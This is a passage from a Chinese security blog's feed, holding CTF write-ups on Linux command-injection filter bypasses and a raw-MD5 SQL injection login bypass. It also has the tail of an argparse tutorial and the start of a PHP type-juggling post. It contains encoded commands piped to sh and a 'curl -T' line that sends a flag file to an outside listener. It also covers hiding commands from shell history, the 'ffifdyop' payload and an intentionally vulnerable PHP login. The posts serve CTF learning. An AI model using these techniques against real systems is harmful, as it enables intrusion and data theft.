class="line">å®šä¹‰åº”è¯¥å¦‚ä½•è§£æä¸€ä¸ªå‘½ä»¤è¡Œå‚æ•°ã€‚ä¸‹é¢æ¯ä¸ªå‚æ•°æœ‰å®ƒä»¬è‡ªå·±è¯¦ç»†çš„æè¿°ï¼Œç®€å•åœ°è®²å®ƒä»¬æ˜¯ï¼š</span><br><span class="line"></span><br><span class="line">name <span class="keyword">or</span> flags - é€‰é¡¹å­—ç¬¦ä¸²çš„åå­—æˆ–è€…åˆ—è¡¨ï¼Œä¾‹å¦‚foo æˆ–è€…-f, --fooã€‚</span><br><span class="line">action - åœ¨å‘½ä»¤è¡Œé‡åˆ°è¯¥å‚æ•°æ—¶é‡‡å–çš„åŸºæœ¬åŠ¨ä½œç±»å‹ã€‚</span><br><span class="line">nargs - åº”è¯¥è¯»å–çš„å‘½ä»¤è¡Œå‚æ•°æ•°ç›®ã€‚</span><br><span class="line">const - æŸäº›actionå’Œnargsé€‰é¡¹è¦æ±‚çš„å¸¸æ•°å€¼ã€‚</span><br><span class="line">default - å¦‚æœå‘½ä»¤è¡Œä¸­æ²¡æœ‰å‡ºç°è¯¥å‚æ•°æ—¶çš„é»˜è®¤å€¼ã€‚</span><br><span class="line">type - å‘½ä»¤è¡Œå‚æ•°åº”è¯¥è¢«è½¬æ¢æˆçš„ç±»å‹ã€‚</span><br><span class="line">choices - å‚æ•°å¯å…è®¸çš„å€¼çš„ä¸€ä¸ªå®¹å™¨ã€‚</span><br><span class="line">required - è¯¥å‘½ä»¤è¡Œé€‰é¡¹æ˜¯å¦å¯ä»¥çœç•¥ï¼ˆåªé’ˆå¯¹å¯é€‰å‚æ•°ï¼‰ã€‚</span><br><span class="line">help - å‚æ•°çš„ç®€çŸ­æè¿°ã€‚</span><br><span class="line">metavar - å‚æ•°åœ¨å¸®åŠ©ä¿¡æ¯ä¸­çš„åå­—ã€‚</span><br><span class="line">dest - ç»™parse_args()è¿”å›çš„å¯¹è±¡è¦æ·»åŠ çš„å±æ€§åç§°ã€‚</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h2><ul><li><p><a href="https://www.cnblogs.com/piperck/p/8446580.html">https://www.cnblogs.com/piperck/p/8446580.html</a> </p></li><li><p><a href="http://vra.github.io/2017/12/02/argparse-usage/">http://vra.github.io/2017/12/02/argparse-usage/</a> </p></li><li><p><a href="https://docs.python.org/zh-cn/3.7/library/argparse.html">https://docs.python.org/zh-cn/3.7/library/argparse.html</a> </p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;Python3ä¸­çš„argparseæ¨¡å—ï¼Œæ˜¯ç”¨æ¥åš&lt;strong&gt;å‘½ä»¤è¡Œå‚æ•°è§£æçš„&lt;/strong&gt;ï¼Œå› ä¸ºoptparseæ¨¡å—å·²ç»ä¸å†æ›´æ–°ï¼Œæ‰€</summary>
      
    
    
    
    <category term="Python" scheme="https://taonn.github.io/categories/Python/"/>
    
    
    <category term="Pythonå¸¸ç”¨æ¨¡å—" scheme="https://taonn.github.io/tags/Python%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97/"/>
    
  </entry>
  
  <entry>
    <title>Linuxåœ¨CTFä¸­çš„ä¸€äº›å°æŠ€å·§</title>
    <link href="https://taonn.github.io/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://taonn.github.io/2020/10/04/Linux%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2020-10-04T01:24:32.000Z</published>
    <updated>2021-03-16T05:28:37.891Z</updated>
    
    <content type="html"><![CDATA[<p>CTFä¸­å„ç§èŠ±é‡Œèƒ¡å“¨çš„æ“ä½œè¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™é‡Œå‚è€ƒå¤§ä½¬çš„æ–‡ç« ï¼Œåšäº†æ›´è¯¦ç»†çš„æ€»ç»“ï¼</p><h2 id="åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼"><a href="#åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼" class="headerlink" title="åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼"></a>åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼</h2><p> å‡å¦‚éœ€è¦å®ç° <strong>cat flag.txt</strong> å‘½ä»¤è¯»å–flagï¼š </p><ol><li>åˆ©ç”¨&lt;&gt;é‡å®šå‘ç¬¦ï¼š</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085145611.png" alt="image-20191203085145611"></p><ol start="2"><li>åˆ©ç”¨${IFS}å˜é‡(å†…éƒ¨åŸŸåˆ†éš”ç¬¦)ï¼š</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085327815.png" alt="image-20191203085327815"></p><ol start="3"><li>åˆ©ç”¨{,}æ¥ä»£æ›¿ï¼š</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085410858.png" alt="image-20191203085410858"></p><ol start="4"><li>åˆ©ç”¨$IFS$9:</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085455982.png" alt="image-20191203085455982"></p><h2 id="åœºæ™¯äºŒï¼šä¸å…è®¸æŒ‡å®šå‘½ä»¤æ‰§è¡Œ"><a href="#åœºæ™¯äºŒï¼šä¸å…è®¸æŒ‡å®šå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åœºæ™¯äºŒï¼šä¸å…è®¸æŒ‡å®šå‘½ä»¤æ‰§è¡Œ"></a>åœºæ™¯äºŒï¼šä¸å…è®¸æŒ‡å®šå‘½ä»¤æ‰§è¡Œ</h2><p> å‡å¦‚éœ€è¦æ‰§è¡Œ <strong>uname</strong> å‘½ä»¤ï¼Œä½†è¿‡æ»¤æ‰äº† uname å­—ç¬¦ï¼š </p><ol><li>åˆ©ç”¨å‚æ•°æ‹¼æ¥ï¼ˆé»‘åå•ç»•è¿‡ï¼‰ï¼š</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085620660.png" alt="image-20191203085620660"></p><ol start="2"><li><p>åˆ©ç”¨â€™ â€œ  å•ã€åŒå¼•å·ï¼ˆç¢°åˆ° escapeshellcmd() æ—¶æœ‰æ•ˆbypassï¼‰ï¼š </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085659619.png" alt="image-20191203085659619"></p></li></ol><p>å•ã€åŒå¼•å·æˆå¯¹å‡ºç°ä¸è¿‡æ»¤ï¼Œè¡¨ç¤ºç©ºå­—ç¬¦ä¸²ï¼›</p><ol start="3"><li>åˆ©ç”¨ <strong>`</strong> å°å¼•å·ï¼Œå°±æ˜¯Tabä¸Šé‚£ä¸ªå¼•å·ï¼š</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085835665.png" alt="image-20191203085835665"></p><p>å¦‚æœä¸€ä¸²å‘½ä»¤ä¸­å­˜åœ¨``ï¼Œä¼šå…ˆæ‰§è¡Œå¼•å·å†…çš„å‘½ä»¤ï¼›</p><p>è¿™ä¹Ÿå°±æ˜¯åˆ©ç”¨DNSä¼ æ•°æ®çš„åˆ©ç”¨ç‚¹ï¼›</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203085954623.png" alt="image-20191203085954623"></p><ol start="4"><li>åˆ©ç”¨è½¬ä¹‰ç¬¦å·\åæ–œæ æ¥ç»•è¿‡</li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090216583.png" alt="image-20191203090216583"></p><h2 id="åœºæ™¯ä¸‰ï¼šä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤"><a href="#åœºæ™¯ä¸‰ï¼šä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤" class="headerlink" title="åœºæ™¯ä¸‰ï¼šä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤"></a>åœºæ™¯ä¸‰ï¼šä¸€æ¬¡æ‰§è¡Œå¤šæ¡å‘½ä»¤</h2><p>å‡å¦‚éœ€è¦æ‰§è¡Œunameå’Œidå‘½ä»¤ï¼š</p><ol><li><p>åˆ©ç”¨shellè„šæœ¬ç»“æŸç¬¦; åˆ†å·ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090345359.png" alt="image-20191203090345359"></p></li><li><p>åˆ©ç”¨é€»è¾‘ç¬¦å·(&amp;,&amp;&amp;,|,||)</p></li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090538453.png" alt="image-20191203090538453"></p><ol start="2"><li>åœ¨Webé¡µé¢æ‰§è¡Œæ—¶å¯ä»¥åˆ©ç”¨å›è½¦çš„urlç¼–ç  <strong>%0a</strong> æ¥ç»•è¿‡ </li></ol><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203090709704.png" alt="image-20191203090709704"></p><p>ç±»ä¼¼åœ¨shellè„šæœ¬ä¸‹æ”¾äº†ä¸¤æ¡å‘½ä»¤</p><h2 id="å‘½ä»¤ç¼–ç ç»•è¿‡"><a href="#å‘½ä»¤ç¼–ç ç»•è¿‡" class="headerlink" title="å‘½ä»¤ç¼–ç ç»•è¿‡"></a>å‘½ä»¤ç¼–ç ç»•è¿‡</h2><p><strong>base64</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | base64</span></span><br><span class="line">d2hvYW1p</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;d2hvYW1p&quot; | base64 -d | sh</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091351029.png" alt="image-20191203091351029"></p><p><strong>xxdï¼ˆ16è¿›åˆ¶ï¼‰</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;whoami&quot; | xxd -p</span></span><br><span class="line">77686f616d69</span><br><span class="line">root@Tao:/tmp<span class="comment"># printf &quot;77686f616d69&quot; | xxd -r -p | sh</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091508479.png" alt="image-20191203091508479"></p><h2 id="å­—ç¬¦æ›¿æ¢"><a href="#å­—ç¬¦æ›¿æ¢" class="headerlink" title="å­—ç¬¦æ›¿æ¢"></a>å­—ç¬¦æ›¿æ¢</h2><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:2:1&#125;</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">ls</span><br><span class="line">root@Tao:/tmp<span class="comment"># $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203091905836.png" alt="image-20191203091905836"></p><p> Linuxï¼š${PATH~: a :b}    å…¶ä¸­aè¡¨ç¤ºä»aä½å¼€å§‹ï¼Œbè¡¨ç¤ºæˆªå–çš„é•¿åº¦ï¼› ï¼ˆä»0å¼€å§‹ï¼ï¼ï¼ï¼‰</p><p>å¦‚æœè¿‡æ»¤äº†å†’å·:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 6 1)</span></span><br><span class="line">l</span><br><span class="line">root@Tao:/tmp<span class="comment"># echo $(expr substr $PATH 3 1)</span></span><br><span class="line">s</span><br><span class="line">root@Tao:/tmp<span class="comment"># $(expr substr $PATH 6 1)$(expr substr $PATH 3 1)</span></span><br><span class="line">flag.txt  tao.sh</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203092308561.png" alt="image-20191203092308561"></p><p><strong>Windows:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;echo %PATH%:~13,1</span><br><span class="line">C:\Program Files (x86)\....</span><br><span class="line">E:\tmp&gt;echo %PATH:~14,1%</span><br><span class="line">e</span><br></pre></td></tr></table></figure><p> Windowsï¼š%PATH:~a,b%  (ä»1å¼€å§‹æ•°)</p><h2 id="curl-T-ä¸Šä¼ æ–‡ä»¶"><a href="#curl-T-ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="curl -T ä¸Šä¼ æ–‡ä»¶"></a>curl -T ä¸Šä¼ æ–‡ä»¶</h2><p>é¦–å…ˆï¼Œwindowsä¸»æœºç›‘å¬ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\tmp&gt;nc.exe -l -v -p 2333</span><br></pre></td></tr></table></figure><p>LinuxæœåŠ¡å™¨å‘é€æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -T .&#x2F;flag.txt http:&#x2F;&#x2F;1.1.1.1:2333</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093411601.png" alt="image-20191203093411601"></p><h2 id="é˜²æ­¢å‘½ä»¤è¢«è®°å½•"><a href="#é˜²æ­¢å‘½ä»¤è¢«è®°å½•" class="headerlink" title="é˜²æ­¢å‘½ä»¤è¢«è®°å½•"></a>é˜²æ­¢å‘½ä»¤è¢«è®°å½•</h2><p>åœ¨ç»ˆç«¯æ‰§è¡Œçš„æ¯ä¸€æ¡å‘½ä»¤éƒ½ä¼šè¢«è®°å½•åœ¨ history æ–‡ä»¶ä¸­ï¼Ÿ</p><p>ä¸æ˜¯çš„ï¼Œå¦‚æœåœ¨å‘½ä»¤å‰åŠ ä¸ª<code>ç©ºæ ¼</code>ï¼Œåˆ™ä¼šä¸è¢«è®°å½•ï¼›</p><p>å¹¶ä¸”å‰åé‡å¤çš„å‘½ä»¤ä¸ä¼šè¢«è®°å½•ï¼›</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203093836873.png" alt="image-20191203093836873"></p><p>noteï¼š</p><p>debainç³»å¯ä»¥ï¼Œcentosç³»ä¸è¡Œï¼›</p><h2 id="åˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤</h2><p> <code>*</code>æ˜¯Linuxä¸‹çš„é€šé…ç¬¦ï¼Œå®ƒä¼šå°†ç¬¦åˆæ¨¡å¼çš„æ–‡ä»¶åˆ—å‡ºæ¥ï¼Œä¹‹åæ‰§è¡Œï¼› </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># touch bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># echo id &gt;&gt; tao.bash</span></span><br><span class="line">root@Tao:/tmp<span class="comment"># ls</span></span><br><span class="line">bash  tao.bash</span><br><span class="line">root@Tao:/tmp<span class="comment"># *</span></span><br><span class="line">uid=0(root) gid=0(root) ç¼ï¿½=0(root)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191203094014805.png" alt="image-20191203094014805"></p><p>å‚è€ƒæ–‡ç« :  <a href="https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/">https://ai-sewell.me/2017/Some-tricks-of-Linux-in-CTF/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CTFä¸­å„ç§èŠ±é‡Œèƒ¡å“¨çš„æ“ä½œè¿˜æ˜¯æŒºå¤šçš„ï¼Œè¿™é‡Œå‚è€ƒå¤§ä½¬çš„æ–‡ç« ï¼Œåšäº†æ›´è¯¦ç»†çš„æ€»ç»“ï¼&lt;/p&gt;
&lt;h2 id=&quot;åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼&quot;&gt;&lt;a href=&quot;#åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼&quot; class=&quot;headerlink&quot; title=&quot;åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼&quot;&gt;&lt;/a&gt;åœºæ™¯ä¸€ï¼šé™åˆ¶ç©ºæ ¼&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="https://taonn.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MD5åŠ å¯†åçš„SQLæ³¨å…¥(éªšæ“ä½œ)</title>
    <link href="https://taonn.github.io/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
    <id>https://taonn.github.io/2020/10/04/MD5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84SQL%E6%B3%A8%E5%85%A5-%E9%AA%9A%E6%93%8D%E4%BD%9C/</id>
    <published>2020-10-04T01:19:11.000Z</published>
    <updated>2021-03-16T05:28:27.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>äº‹æƒ…çš„èµ·å› æ˜¯,æˆ‘åœ¨çœ‹ä¸€ç¯‡å¤§ä½¬å†™çš„writeup,å…³äº<code>sniperoj-web</code>çš„è§£æï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªå…³äºMD5åŠ å¯†sqlæ³¨å…¥çš„éªšæ“ä½œï¼Œæˆ‘ä¾¿è‡ªå·±å¼€å§‹æ­ç¯å¢ƒï¼Œå‡†å¤‡å¤ç°ä¸€æ³¢</p><p>æˆ‘è¿™é‡Œåˆ©ç”¨çš„æ˜¯dvwaçš„è´¦å·å¯†ç çš„ç¯å¢ƒ</p><p> <img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117094144398.png" alt="image-20191117094144398"></p><p><code>5f4dcc3b5aa765d61d8327deb882cf99</code>æ”¾åˆ°MD5è§£å¯†ç½‘ç«™è§£å¯†ä¸º<code>password</code>ï¼Œè¿™æˆ‘å°±ä¸è¯¦ç»†è¯´äº†</p><h2 id="å®éªŒè¿‡ç¨‹"><a href="#å®éªŒè¿‡ç¨‹" class="headerlink" title="å®éªŒè¿‡ç¨‹"></a>å®éªŒè¿‡ç¨‹</h2><p>å…³äºè¿™é‡Œsqlæ³¨å…¥ï¼Œå¤§ä½¬æ˜¯è¿™æ ·è¯´çš„</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117094459258.png" alt="image-20191117095108380"></p><p>äºæ˜¯æˆ‘ä¹‹å‰æ­å»ºç¯å¢ƒï¼Œè¿›è¡Œäº†æµ‹è¯•.(ä»¥ä¸‹æ˜¯æˆ‘è‡ªå·±ä¸ºäº†æµ‹è¯•ï¼Œå†™çš„ä»£ç )</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">USERNAME:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">PASSWORD:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;sub&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$host = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">$user = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$passwd = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;sub&#x27;</span>]))&#123;</span><br><span class="line">$username = $_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$conn = <span class="keyword">new</span> PDO(<span class="string">&quot;mysql:host=<span class="subst">$host</span>;dbname=dvwa&quot;</span>, $user, $passwd);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM users WHERE password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>; <span class="comment">// é‡ç‚¹åœ¨è¿™é‡Œ</span></span><br><span class="line">$q = $conn-&gt;query($sql);</span><br><span class="line">$res = $q-&gt;fetch();</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> $res[<span class="string">&#x27;password&#x27;</span>] == md5(<span class="string">&#x27;password&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> $username.<span class="string">&#x27;ç™»å½•æˆåŠŸï¼&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;è¯·ç™»å…¥ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚çš„åŸç†å°±æ˜¯<code>$sql = &quot;SELECT * FROM users WHERE password = &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</code> </p><p>ä¸Šè¿°çš„æŸ¥è¯¢è¯­å¥ï¼Œå¦‚æœ<code>$password= ffifdyop </code> , md5åï¼Œ<code>276f722736c95d99e921722cf9ed621c </code>ï¼Œ å†è½¬æˆå­—ç¬¦ä¸²ï¼š  â€˜orâ€™6<trash> </p><p>é‚£ä¹ˆsqlè¯­å¥å°±æˆäº†<code>SELECT * FROM users WHERE password = &#39;&#39;or&#39;6&lt;trash&gt;&#39; </code>,ä»è€Œç»•è¿‡</p><p>æˆ‘ä»¬è¿›è¡Œæµ‹è¯•ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20191117095108380.png" alt="image-20191117094459258"></p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><ul><li><a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a> </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;äº‹æƒ…çš„èµ·å› æ˜¯,æˆ‘åœ¨çœ‹ä¸€ç¯‡å¤§ä½¬å†™çš„writeup,å…³äº&lt;code&gt;sniperoj-web&lt;/code&gt;çš„è§£æï¼Œæˆ‘å‘ç°äº†ä¸€ä¸ªå…³äºMD5åŠ å¯†sq</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="phpå®‰å…¨" scheme="https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHPé»‘é­”æ³•å­¦ä¹ æ€»ç»“</title>
    <link href="https://taonn.github.io/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <id>https://taonn.github.io/2020/10/04/PHP%E9%BB%91%E9%AD%94%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</id>
    <published>2020-10-04T01:17:05.000Z</published>
    <updated>2021-03-16T05:27:51.057Z</updated>
    
    <content type="html"><![CDATA[<h1 id="phpé»‘é­”æ³•"><a href="#phpé»‘é­”æ³•" class="headerlink" title="phpé»‘é­”æ³•"></a>phpé»‘é­”æ³•</h1><p>  phpé»‘é­”æ³•å°±æ˜¯æ‰€è°“çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œä¸€äº›å‡½æ•°è¿”å›null,åˆ©ç”¨æ•°ç»„è¿”å›Trueçš„ä¸€äº›é—®é¢˜</p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;betao.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Ture&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;False&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="comment">// ä»¥ä¸Šä»£ç è¾“å‡º Ture</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">$b = <span class="string">&#x27;3betao.cn&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> ($b &gt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;True&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span 